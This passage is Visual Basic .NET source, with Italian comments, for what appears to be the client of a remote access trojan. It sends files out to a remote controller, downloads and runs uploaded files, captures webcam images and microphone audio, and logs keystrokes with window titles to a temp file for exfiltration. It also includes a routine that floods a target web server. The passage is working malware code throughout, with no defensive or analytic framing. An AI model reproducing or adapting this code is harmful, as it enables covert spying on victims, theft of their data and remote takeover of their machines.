                    Dim buffer4(clientdow.Available - 1) As Byte
                    netstreamdow.Read(buffer4, 0, buffer4.Length)

                    Dim datiadow As String = UTF8.GetString(buffer4)


                    If InStr(datiadow, "|^D°wS#t^|") Then
                        FileNameDow = Replace(datiadow, "|^D°wS#t^|", "")
                        datiadow = ""
                        If Dir(FileNameDow) <> "" Then
                            ReDim FileData(FileLen(FileNameDow) - 1)
                            Try
                                FileOpen(71, FileNameDow, OpenMode.Binary)
                                FileGet(71, FileData)
                                FileClose(71)
                                netstreamdow.Write(UTF8.GetBytes("||vsizfil{}" & FileLen(FileNameDow)), 0, UTF8.GetBytes("||vsizfil{}" & FileLen(FileNameDow)).Length) 'invio il comando al server
                            Catch ex As Exception
                                netstream.Write(UTF8.GetBytes("{+Errd}" & FileNameDow), 0, UTF8.GetBytes("{+Errd}" & FileNameDow).Length) 'invio il comando al server
                            End Try
                        Else
                            netstream.Write(UTF8.GetBytes("\Del£FtoD" & FileNameDow), 0, UTF8.GetBytes("\Del£FtoD" & FileNameDow).Length) 'invio il comando al server
                        End If
                    End If


                    If InStr(datiadow, "^O°K0^") Then
                        datiadow = ""
                        netstreamdow.Write(FileData, 0, FileData.Length) 'invio il comando al server
                    End If

                Catch ex As Exception
                End Try
            End If

        Else
            FileClose(71)
            tmrDatiDow.Enabled = False
        End If
    End Sub

    Private Sub tmrUpCl_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrUpCl.Tick
        Try
            If Not clientup.Connected = True Then
                If bkwU.IsBusy = False Then
                    bkwU.RunWorkerAsync()
                End If
            Else
                tmrUpCl.Stop()
                tmrDatiUp.Start()
            End If
        Catch ex As Exception
            clientup.Close()
            clientup = New TcpClient
        End Try
    End Sub

    Private Sub tmrDatiUp_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiUp.Tick
        If clientup.Connected = True Then 'Verifico se il client è connesso

            If clientup.Available > 0 Then 'Verifico se riceve dati
                Try
                    Dim buffer7(clientup.Available - 1) As Byte 'Dichiaro un array di byte di dimensione pari ai dai arrivati
                    netstreamup.Read(buffer7, 0, buffer7.Length) 'Leggo i dati

                    If InStr(UTF8.GetString(buffer7), "|^Ca/çz£u^|") Then
                        Try
                            FileClose(87)
                            PathToOpenF = Split(UTF8.GetString(buffer7), "|^Ca/çz£u^|")
                            ByArrUpTot = PathToOpenF(1)

                            If Dir(PathToOpenF(0)) <> "" Then
                                Kill(PathToOpenF(0))
                            End If
                            FileOpen(87, PathToOpenF(0), OpenMode.Binary)
                            netstreamup.Write(UTF8.GetBytes("{Up/}OK"), 0, UTF8.GetBytes("{Up/}OK").Length) 'invio il comando al server
                        Catch ex As Exception
                            FileClose(87)
                            ByArrUp = 0
                            ByArrUpTot = 0
                            netstream.Write(UTF8.GetBytes("{NOT\O"), 0, UTF8.GetBytes("{NOT\O").Length) 'invio il comando al server
                        End Try
                    Else
                        If Not InStr(UTF8.GetString(buffer7), "TAR|T/") Then
                            Try
                                FilePut(87, buffer7)
                            Catch ex As Exception
                                FileClose(87)
                                ByArrUp = 0
                                ByArrUpTot = 0
                                netstream.Write(UTF8.GetBytes("{NOT\O"), 0, UTF8.GetBytes("{NOT\O").Length) 'invio il comando al server
                            End Try
                            ByArrUp = ByArrUp + buffer7.Length

                            If ByArrUp = ByArrUpTot Then
                                FileClose(87)
                                ByArrUp = 0
                                ByArrUpTot = 0
                                If AvvFiUpp = True Then
                                    Try
                                        Process.Start(PathToOpenF(0))
                                    Catch ex As Exception
                                    End Try
                                End If
                                netstreamup.Write(UTF8.GetBytes("ow|^e$"), 0, UTF8.GetBytes("ow|^e$").Length) 'invio il comando al server
                            End If
                        Else
                            Try
                                Process.Start(Replace(UTF8.GetString(buffer7), "TAR|T/", ""))
                            Catch ex As Exception
                            End Try
                        End If
                    End If
                Catch ex As Exception
                End Try

            End If
        Else
            FileClose(87)
            tmrDatiUp.Enabled = False
        End If

    End Sub

    Private Sub tmrWebCl_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrWebCl.Tick
        Try
            If Not clientweb.Connected = True Then
                If bkwW.IsBusy = False Then
                    bkwW.RunWorkerAsync()
                End If
            Else
                tmrWebCl.Stop()
                tmrDatiWeb.Start()
            End If
        Catch ex As Exception
            clientweb.Close()
            clientweb = New TcpClient
        End Try
    End Sub



    Private Sub startPreview()
        Try
            Dim iHeight As Integer = MacBew.Height
            Dim iWidth As Integer = MacBew.Width
            HPazzo = capCreateCaptureWindowA(Dev3, WS_VISIBLE Or WS_CHILD, 0, 0, 640, _
            480, MacBew.Handle.ToInt32, 0)
            If mdMacBew.SendMessage(HPazzo, WM_CAP_DRIVER_CONNECT, Dev3, 0) Then
                mdMacBew.SendMessage(HPazzo, WM_CAP_SET_SCALE, True, 0)
                mdMacBew.SendMessage(HPazzo, WM_CAP_SET_PREVIEWRATE, 66, 0)
                mdMacBew.SendMessage(HPazzo, WM_CAP_SET_PREVIEW, True, 0)
                mdMacBew.SetWindowPos(HPazzo, HWND_BOTTOM, 0, 0, iWidth, iHeight, _
                SWP_NOMOVE Or SWP_NOZORDER)
            Else
                DestroyWindow(HPazzo)
            End If
        Catch ex As Exception
            netstream.Write(
               UTF8.GetBytes("ç/@ErW"), 0, UTF8.GetBytes("ç/@ErW").Length) 'invio il comando al server
        End Try
    End Sub

    Private Sub tmrDatiWeb_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiWeb.Tick
        If clientweb.Connected = True Then
            If clientweb.Available > 0 Then
                Try
                    Dim buffer10(clientweb.Available - 1) As Byte
                    netstreamweb.Read(buffer10, 0, buffer10.Length)
                    Dim datiaweb As String = UTF8.GetString(buffer10)
                    If InStr(datiaweb, "<Wake>") Then

                        If XYimw = "" Then
                            FileClose(66)
                            mdMacBew.SendMessage(HPazzo, WM_CAP_FILE_SAVEDIB, 0&, Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp")
                            If Dir(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp") <> "" Then
                                'carica immagine originale
                                bm2 = New Bitmap(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp")
                                'ricava dimensioni originali dell'immagine
                                originalX2 = bm2.Width
                                originalY2 = bm2.Height
                                'imposta dimensioni finali
                                destinationX2 = (originalX2 * Replace(PerWe, "|O%|h", "")) / 100
                                destinationY2 = (originalY2 * Replace(PerWe, "|O%|h", "")) / 100
                                ResizeImageweb(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp")
                                lbytesw = 0
                                ReDim bufferimmagw(FileLen(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".bmp") - 1)
                                Try
                                    FileOpen(66, Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".bmp", OpenMode.Binary)

                                    FileGet(66, bufferimmagw, 1)
                                    FileClose(66)
                                Catch ex As Exception
                                End Try
                                Dim fsizsch2w As Integer
                                fsizsch2w = FileLen(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".bmp")
                                If Dir(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".bmp") <> "" Then
                                    Kill(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".bmp")
                                End If
                                If Dir(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp") <> "" Then
                                    Kill(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp")
                                End If

                                netstreamweb.Write(
                                UTF8.GetBytes("<<LookWize>>" & fsizsch2w), 0, UTF8.GetBytes(
                                    "<<LookWize>>" & fsizsch2w).Length) 'invio il comando al server
                            End If
                        Else
                            FileClose(66)
                            mdMacBew.SendMessage(HPazzo, WM_CAP_FILE_SAVEDIB, 0&, Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp")
                            'carica immagine originale
                            If Dir(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp") <> "" Then
                                bm2 = New Bitmap(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp")
                                'ricava dimensioni originali dell'immagine
                                originalX2 = bm2.Width
                                originalY2 = bm2.Height
                                'imposta dimensioni finali
                                destinationX2 = (Split(XYimw, " , ")(0) * Replace(PerWe, "|O%|h", "")) / 100
                                destinationY2 = (Split(XYimw, " , ")(1) * Replace(PerWe, "|O%|h", "")) / 100
                                ResizeImageweb(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp")
                                lbytesw = 0
                                ReDim bufferimmagw(FileLen(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".bmp") - 1)
                                Try
                                    FileOpen(66, Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".bmp", OpenMode.Binary)

                                    FileGet(66, bufferimmagw, 1)
                                    FileClose(66)
                                Catch ex As Exception
                                End Try
                                Dim fsizsch2w As Integer
                                fsizsch2w = FileLen(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".bmp")
                                If Dir(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".bmp") <> "" Then
                                    Kill(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".bmp")
                                End If
                                If Dir(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp") <> "" Then
                                    Kill(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp")
                                End If
                                netstreamweb.Write(
                                UTF8.GetBytes("<<LookWize>>" & fsizsch2w), 0, UTF8.GetBytes(
                                    "<<LookWize>>" & fsizsch2w).Length) 'invio il comando al server
                            End If

                            End If
                    End If

                    If InStr(datiaweb, "{Ok}") Then
                        FileClose(66)
                        netstreamweb.Write(
                        bufferimmagw, 0, bufferimmagw.Length) 'invio il comando al server
                    End If
                Catch ex As Exception
                End Try
            End If
        Else
            FileClose(66)
            If Dir(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".bmp") <> "" Then
                Kill(Environ("TEMP") & "\" & "r_" & Me.Handle.ToInt32 & ".bmp")
            End If
            If Dir(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp") <> "" Then
                Kill(Environ("TEMP") & "\" & Me.Handle.ToInt32 & ".bmp")
            End If
            tmrDatiWeb.Enabled = False
        End If
    End Sub

    Private Sub tmrKeyCl_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrKeyCl.Tick
        Try
            If Not clientkey.Connected = True Then
                If bkwK.IsBusy = False Then
                    bkwK.RunWorkerAsync()
                End If
            Else
                tmrKeyCl.Stop()
                tmrDatiKey.Start()
            End If
        Catch ex As Exception
            clientkey.Close()
            clientkey = New TcpClient
        End Try
    End Sub

    Public Function RVK(ByVal Vl As String) As String
        With Vl
            Vl = .Replace("a", "1")
            Vl = .Replace("b", "2")
            Vl = .Replace("c", "3")
            Vl = .Replace("d", "4")
            Vl = .Replace("e", "5")
            Vl = .Replace("f", "6")
            Vl = .Replace("g", "7")
            Vl = .Replace("h", "8")
            Vl = .Replace("i", "9")
            Vl = .Replace("`", "0")
        End With
        RVK = Vl
        Return Vl

    End Function

    Private Sub DRN(ByVal Cha As Char)
        TSTOT = TSTOT + Cha

        If TSTOT.Length > 16 Then
            TSTOT = TSTOT.Remove(0, 1)
        End If
        TSTOT = RVK(TSTOT)
    End Sub

    Function ConP(ByVal vl2 As Integer) As String
        If vl2 = 190 AndAlso My.Computer.Keyboard.ShiftKeyDown Then
            Return ":"
        ElseIf vl2 = 188 AndAlso My.Computer.Keyboard.ShiftKeyDown Then
            Return ";"
        ElseIf vl2 = 188 Then
            Return ","
        ElseIf vl2 = 190 Then
            Return "."
        ElseIf vl2 = 162 Then
            Return "[CTRL]"
        Else
            Return Nothing
        End If
    End Function


    Private Function GAWT() As String
        Dim Stringa As String = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, Stringa, 100)
        Stringa = Stringa.Substring(0, InStr(Stringa, Chr(0)) - 1)
        GAWT = Stringa
        Return Stringa
    End Function

    Public Function CCar(ByVal CM As Char) As Char
        If ktype = "En" Then
            If CM = CType("1", Char) Then
                Return CType("!", Char)
            ElseIf CM = CType("2", Char) Then
                Return CType("@", Char)
            ElseIf CM = CType("3", Char) Then
                Return CType("#", Char)
            ElseIf CM = CType("4", Char) Then
                Return CType("$", Char)
            ElseIf CM = CType("5", Char) Then
                Return CType("%", Char)
            ElseIf CM = CType("6", Char) Then
                Return CType("^", Char)
            ElseIf CM = CType("7", Char) Then
                Return CType("&", Char)
            ElseIf CM = CType("8", Char) Then
                Return CType("*", Char)
            ElseIf CM = CType("9", Char) Then
                Return CType("(", Char)
            ElseIf CM = CType("0", Char) Then
                Return CType(")", Char)
            ElseIf CM = Chr(189) Then
                Return CType("_", Char)
            End If
            CCar = CM
        End If

        If ktype = "It" Then
            If CM = CType("1", Char) Then
                Return CType("!", Char)
            ElseIf CM = CType("2", Char) Then
                Return CType("""", Char)
            ElseIf CM = CType("3", Char) Then
                Return CType("£", Char)
            ElseIf CM = CType("4", Char) Then
                Return CType("$", Char)
            ElseIf CM = CType("5", Char) Then
                Return CType("%", Char)
            ElseIf CM = CType("6", Char) Then
                Return CType("&", Char)
            ElseIf CM = CType("7", Char) Then
                Return CType("/", Char)
            ElseIf CM = CType("8", Char) Then
                Return CType("(", Char)
            ElseIf CM = CType("9", Char) Then
                Return CType(")", Char)
            ElseIf CM = CType("0", Char) Then
                Return CType("=", Char)
            ElseIf CM = Chr(189) Then
                Return CType("_", Char)
            End If
            CCar = CM
        End If

        Return CM
    End Function

    Public Function SalKrt(ByVal CrM As Char) As String
        If CrM = "p" Then
            Return "[F1]"
        ElseIf CrM = "q" Then
            Return "[F2]"
        ElseIf CrM = "r" Then
            Return "[F3]"
        ElseIf CrM = "s" Then
            Return "[F4]"
        ElseIf CrM = "t" Then
            Return "[F5]"
        ElseIf CrM = "u" Then
            Return "[F6]"
        ElseIf CrM = "v" Then
            Return "[F7]"
        ElseIf CrM = "w" Then
            Return "[F8]"
        ElseIf CrM = "x" Then
            Return "[F9]"
        ElseIf CrM = "y" Then
            Return "[F10]"
        ElseIf CrM = "z" Then
            Return "[F11]"
        ElseIf CrM = "{" Then
            Return "[F12]"
        ElseIf CrM = "&" Then
            Return "[^]"
        ElseIf CrM = "(" Then
            Return "[v]"
        ElseIf CrM = "%" Then
            Return "[<-]"
        ElseIf CrM = "'" Then
            Return "[->]"
        ElseIf CrM = Chr(34) Then
            Return "[PAGE DOWN]"
        ElseIf CrM = "!" Then
            Return "[PAGE UP]"
        ElseIf CrM = "#" Then
            Return "[END]"
        ElseIf CrM = "$" Then
            Return "[HOME]"
        ElseIf CrM = "." Then
            Return "[DELETE]"
        ElseIf CrM = "[" Then
            Return "[WINDOWS KEY]"
        ElseIf CrM = "]" Then
            Return "[MENU KEY]"
        Else
            Return Nothing
        End If
        SalKrt = CrM
        Return CrM

    End Function

    Private Sub tmrK_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrK.Tick
        Dim T1234 As Char
        Dim SCR As String
        For kioah = 1 To 226
            Dim restes As Integer = 0
            restes = GetAsyncKeyState(kioah)
            If restes = -32767 Then
                T1234 = Chr(kioah)
                If kioah = 8 Then
                    txtK.Text = txtK.Text & "[BACK]"
                    T1234 = Nothing
                ElseIf kioah > 95 And kioah < 106 Then
                    T1234 = Chr(kioah - 48)
                    txtK.Text = txtK.Text & T1234
                ElseIf Chr(kioah) = "" Then
                    T1234 = Nothing
                    txtK.Text = txtK.Text & T1234
                ElseIf kioah = 189 AndAlso My.Computer.Keyboard.ShiftKeyDown Then
                    txtK.Text = txtK.Text & "_"
                ElseIf Chr(kioah) = Chr(189) Then
                    txtK.Text = txtK.Text & "-"
                ElseIf Chr(kioah) = Chr(40) Then
                    txtK.Text = txtK.Text & "[DOWN]"
                ElseIf Chr(kioah) = Chr(38) Then
                    txtK.Text = txtK.Text & "[UP]"
                ElseIf Chr(kioah) = Chr(39) Then
                    txtK.Text = txtK.Text & "[RIGHT]"
                ElseIf Chr(kioah) = Chr(46) Then
                    txtK.Text = txtK.Text & "[DEL]"
                ElseIf Chr(kioah) = Chr(17) Then
                    txtK.Text = txtK.Text & "[CTRL]"
                ElseIf Chr(kioah) = Chr(37) Then
                    txtK.Text = txtK.Text & "[LEFT]"
                ElseIf Chr(kioah) = Chr(44) Then
                    txtK.Text = txtK.Text & "[STAMP]"
                ElseIf Chr(kioah) = Chr(187) AndAlso My.Computer.Keyboard.ShiftKeyDown Then
                    txtK.Text = txtK.Text & "*"
                ElseIf Chr(kioah) = Chr(187) Then
                    txtK.Text = txtK.Text & "+"
                ElseIf Chr(kioah) = Chr(186) AndAlso My.Computer.Keyboard.ShiftKeyDown Then
                    txtK.Text = txtK.Text & "é"
                ElseIf Chr(kioah) = Chr(186) Then
                    txtK.Text = txtK.Text & "è"
                ElseIf Chr(kioah) = Chr(220) AndAlso My.Computer.Keyboard.ShiftKeyDown Then
                    txtK.Text = txtK.Text & "|"
                ElseIf Chr(kioah) = Chr(220) Then
                    txtK.Text = txtK.Text & "\"
                ElseIf Chr(kioah) = Chr(219) AndAlso My.Computer.Keyboard.ShiftKeyDown Then
                    txtK.Text = txtK.Text & "?"
                ElseIf Chr(kioah) = Chr(219) Then
                    txtK.Text = txtK.Text & "'"
                ElseIf Chr(kioah) = Chr(221) AndAlso My.Computer.Keyboard.ShiftKeyDown Then
                    txtK.Text = txtK.Text & "^"
                ElseIf Chr(kioah) = Chr(221) Then
                    txtK.Text = txtK.Text & "ì"
                ElseIf Chr(kioah) = Chr(192) AndAlso My.Computer.Keyboard.ShiftKeyDown Then
                    txtK.Text = txtK.Text & "ç"
                ElseIf Chr(kioah) = Chr(192) Then
                    txtK.Text = txtK.Text & "ò"
                ElseIf Chr(kioah) = Chr(222) AndAlso My.Computer.Keyboard.ShiftKeyDown Then
                    txtK.Text = txtK.Text & "°"
                ElseIf Chr(kioah) = Chr(222) Then
                    txtK.Text = txtK.Text & "à"
                ElseIf Chr(kioah) = Chr(191) AndAlso My.Computer.Keyboard.ShiftKeyDown Then
                    txtK.Text = txtK.Text & "§"
                ElseIf Chr(kioah) = Chr(191) Then
                    txtK.Text = txtK.Text & "ù"
                ElseIf Chr(kioah) = Chr(226) AndAlso My.Computer.Keyboard.ShiftKeyDown Then
                    txtK.Text = txtK.Text & ">"
                ElseIf Chr(kioah) = Chr(226) Then
                    txtK.Text = txtK.Text & "<"
                ElseIf kioah > 128 Then
                    T1234 = CType(ConP(kioah), Char)
                    txtK.Text = txtK.Text & T1234
                ElseIf My.Computer.Keyboard.CapsLock Then
                    txtK.Text = txtK.Text & T1234
                ElseIf Chr(kioah) = Chr(16) Then
                    T1234 = Nothing
                ElseIf My.Computer.Keyboard.ShiftKeyDown Then
                    T1234 = CCar(T1234)
                    txtK.Text = txtK.Text & T1234
                ElseIf Chr(kioah) = Chr(9) Then
                    SCR = "[Tab]"
                    txtK.Text = txtK.Text & SCR
                ElseIf Chr(kioah) = Chr(13) Then
                    txtK.Text = txtK.Text & vbCrLf
                ElseIf Not Char.IsUpper(T1234) AndAlso Not T1234 = " " AndAlso Not Char.IsNumber(T1234) Then
                    SCR = SalKrt(T1234)
                    If Not SCR = Nothing Then
                        txtK.Text = txtK.Text
                    End If
                Else
                    T1234 = Char.ToLower(T1234)
                    DRN(T1234)
                    txtK.Text = txtK.Text & T1234
                End If
            End If
        Next kioah


        Try
            If instkoff = True Then
                Dim wr2 As StreamWriter
                wr2 = New StreamWriter(Environ("TEMP") & "\WinfileLog.txt", False)
                wr2.Write(Lettura2 & txtK.Text)
                wr2.Flush()
                wr2.Close()
            End If

        Catch ex As Exception
        End Try

    End Sub

    Private Sub tmrDatiKey_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiKey.Tick
        If clientkey.Connected = True Then
            If clientkey.Available > 0 Then
                Try
                    Dim buffer11(clientkey.Available - 1) As Byte
                    netstreamkey.Read(buffer11, 0, buffer11.Length)

                    Dim datiakey As String = UTF8.GetString(buffer11)


                    If InStr(datiakey, "S/ta°K") Then
                        datiakey = ""
                        If tmrK.Enabled = False Then
                            tmrK.Enabled = True
                        End If
                        Dim TA As String = txtK.Text
                        netstreamkey.Write(UTF8.GetBytes("§\°KK" & GAWT() & "<{']>" & TA), 0, UTF8.GetBytes("§\°KK" & GAWT() & "<{']>" & TA).Length) 'invio il comando al Server

                    End If



                    If InStr(datiakey, "STO|K") Then
                        instkoff = False
                        Lettura2 = ""
                        Try
                            Kill(Environ("TEMP") & "\WinfileLog.txt")
                        Catch ex As Exception
                        End Try
                        txtK.Text = ""
                        datiakey = ""
                        tmrK.Enabled = False
                    End If

                    If InStr(datiakey, "O|f°Of") Then
                        datiakey = ""
                        Try
                            Dim fileReader As System.IO.StreamReader
                            fileReader = _
                            My.Computer.FileSystem.OpenTextFileReader(Environ("TEMP") & "\WinfileLog.txt")
                            Dim Lettura As String
                            Lettura = fileReader.ReadToEnd
                            fileReader.Close()
                            Dim LenK As Integer = FileLen(Environ("TEMP") & "\WinfileLog.txt")

                            ReDim FiByK(LenK - 1)

                            FiByK = My.Computer.FileSystem.ReadAllBytes(Environ("TEMP") & "\WinfileLog.txt")

                            netstreamkey.Write(FiByK, 0, FiByK.Length) 'invio il comando al Server
                        Catch ex As Exception
                            netstreamkey.Write(UTF8.GetBytes("UnK|"), 0, UTF8.GetBytes("UnK|").Length) 'invio il comando al Server
                        End Try
                    End If

                Catch ex As Exception
                End Try
            End If
        Else

            txtK.Text = ""
            tmrDatiKey.Enabled = False
        End If
    End Sub


    Private Sub tmrSDCl_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrSDCl.Tick
        Try
            If Not clientSD.Connected = True Then
                If bkwSDC.IsBusy = False Then
                    bkwSDC.RunWorkerAsync()
                End If
            Else
                tmrSDCl.Stop()
                tmrDatiSD.Start()
            End If
        Catch ex As Exception
            clientSD.Close()
            clientSD = New TcpClient
        End Try
    End Sub

    Private Sub tmrDatiSD_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiSD.Tick
        If clientSD.Connected = True Then
            If clientSD.Available > 0 Then
                Try
                    Dim buffer20(clientSD.Available - 1) As Byte
                    netstreamSD.Read(buffer20, 0, buffer20.Length)
                    Dim datiasd As String = UTF8.GetString(buffer20)

                    If InStr(datiasd, ":>Sta1|") Then
                        datiasd = ""
                        mciSendString("open new Type waveaudio Alias recsound", "", 0, 0)
                        mciSendString("record recsound", "", 0, 0)
                    End If

                    If InStr(datiasd, ">AVV<") Then
                        If VarS = True Then
                            FileClose(69)
                        End If

                        If VarS = False Then
                            mciSendString("save recsound " & Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav", "", 0, 0)
                            mciSendString("close recsound", "", 0, 0)
                            FileClose(69)
                            ReDim BySD(FileLen(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav") - 1)
                            FileOpen(69, Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav", OpenMode.Binary)
                            FileGet(69, BySD)
                            FileClose(69)
                            If Dir(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav") <> "" Then
                                Kill(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav")
                            End If
                            If Dir(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav") <> "" Then
                                Kill(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav")
                            End If
                        End If

                        If VarS = True Then
                            mciSendString("save recsound " & Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav", "", 0, 0)
                            mciSendString("close recsound", "", 0, 0)
                            ReDim BySD(FileLen(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav") - 1)
                            FileOpen(69, Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav", OpenMode.Binary)
                            FileGet(69, BySD)
                            FileClose(69)
                            mciSendString("open new Type waveaudio Alias recsound", "", 0, 0)
                            mciSendString("record recsound", "", 0, 0)
                            VarS = False
                            If Dir(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav") <> "" Then
                                Kill(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav")
                            End If
                            If Dir(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav") <> "" Then
                                Kill(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav")
                            End If
                            netstreamSD.Write(
                           UTF8.GetBytes(TimeOfDay & "<LS>" & BySD.Length), 0, UTF8.GetBytes(TimeOfDay & "<LS>" & BySD.Length).Length) 'invio il comando al server
                        Else
                            mciSendString("open new Type waveaudio Alias recsound", "", 0, 0)
                            mciSendString("record recsound", "", 0, 0)
                            VarS = True
                            If Dir(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav") <> "" Then
                                Kill(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav")
                            End If
                            If Dir(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav") <> "" Then
                                Kill(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav")
                            End If
                            netstreamSD.Write(
                           UTF8.GetBytes("<LS>" & BySD.Length), 0, UTF8.GetBytes("<LS>" & BySD.Length).Length) 'invio il comando al server
                        End If

                    End If

                    If InStr(datiasd, "<Se|da") Then
                        datiasd = ""
                        If Dir(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav") <> "" Then
                            Kill(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav")
                        End If
                        If Dir(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav") <> "" Then
                            Kill(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav")
                        End If
                        netstreamSD.Write(BySD, 0, BySD.Length) 'invio il comando al server
                    End If


                    If InStr(datiasd, "|ST<") Then
                        datiasd = ""
                        VarS = False
                        mciSendString("close recsound", "", 0, 0)
                        If Dir(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav") <> "" Then
                            Kill(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav")
                        End If
                        If Dir(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav") <> "" Then
                            Kill(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav")
                        End If
                    End If
                Catch ex As Exception
                End Try
            End If

        Else
            VarS = False
            FileClose(69)
            mciSendString("close recsound", "", 0, 0)
            If Dir(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav") <> "" Then
                Kill(Environ("TEMP") & "\" & "2" & Me.Handle.ToInt32 & ".wav")
            End If
            If Dir(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav") <> "" Then
                Kill(Environ("TEMP") & "\" & "1" & Me.Handle.ToInt32 & ".wav")
            End If
        End If
    End Sub

    Private Sub bkwSD_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bkwSD.DoWork
        Try
            My.Computer.Audio.Play(SoWav)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub bkwHttF_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bkwHttF.DoWork
        Try
            For flo = 1 To NumFor
                byfllo = byfllo & "////555dddaahfgfgsjdhgfh555d%%%jhfjsdkfhs%%jgdhffgs%%%dsfghs%%6454GETGET:::@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@" & vbCrLf

                Dim ipE As IPHostEntry = Dns.GetHostEntry(U)
                Dim IpA As IPAddress() = ipE.AddressList

                Dim i As Integer
                For i = 0 To IpA.Length - 1
                    Dim host As IPAddress = IPAddress.Parse(IpA(i).ToString())
                    Dim hostaddress As New IPEndPoint(host, 80)
                    Dim sock As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

                    Try
                        sock.Connect(hostaddress)
                    Catch ex As SocketException
                        sock.Close()
                        byfllo = ""
                        Exit Sub
                    End Try
                    Try
                        sock.Send(Encoding.ASCII.GetBytes(byfllo))
                    Catch ex2 As SocketException
                        sock.Close()
                        byfllo = ""
                        Exit Sub
                    End Try
                    byfllo = ""
                    sock.Close()
                Next i
            Next flo
            byfllo = ""
        Catch ex As Exception
        End Try
    End Sub


    Private Sub bkwS_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bkwS.DoWork
        Try
            clientschermo.Connect(IpAd, ps)
            netstreamschermo = clientschermo.GetStream
            netstream.Write(
           UTF8.GetBytes("<SchConness>"), 0, UTF8.GetBytes(
               "<SchConness>").Length) 'invio il comando al server
        Catch ex As Exception
            clientschermo.Close()
            clientschermo = New TcpClient
        End Try

    End Sub


    Private Sub bkwD_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bkwD.DoWork
        Try
            clientdow.Connect(IpAd, pdw)
            netstreamdow = clientdow.GetStream
            netstream.Write(
            UTF8.GetBytes("ahdow|+^"), 0, UTF8.GetBytes(
              "ahdow|+^").Length) 'invio il comando al server
        Catch ex As Exception
            clientdow.Close()
            clientdow = New TcpClient
        End Try
    End Sub

    Private Sub bkwU_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bkwU.DoWork
        Try
            clientup.Connect(IpAd, pu)
            netstreamup = clientup.GetStream
            netstream.Write(
            UTF8.GetBytes("^ì^||AtUp"), 0, UTF8.GetBytes(
              "^ì^||AtUp").Length) 'invio il comando al server
        Catch ex As Exception
            clientup.Close()
            clientup = New TcpClient
        End Try
    End Sub

